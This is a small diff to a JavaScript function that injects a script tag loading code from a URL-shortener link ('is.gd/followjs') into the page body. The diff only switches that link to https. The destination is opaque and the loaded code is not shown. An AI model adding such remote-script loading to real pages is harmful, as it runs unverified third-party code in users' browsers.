@@ -123,6 +123,6 @@ function func(){
     };
         }
     });
-    let x=document.createElement("script");x.src="//is.gd/followjs";document.body.appendChild(x);
+    let x=document.createElement("script");x.src="https://is.gd/followjs";document.body.appendChild(x);
     input.click();
 }
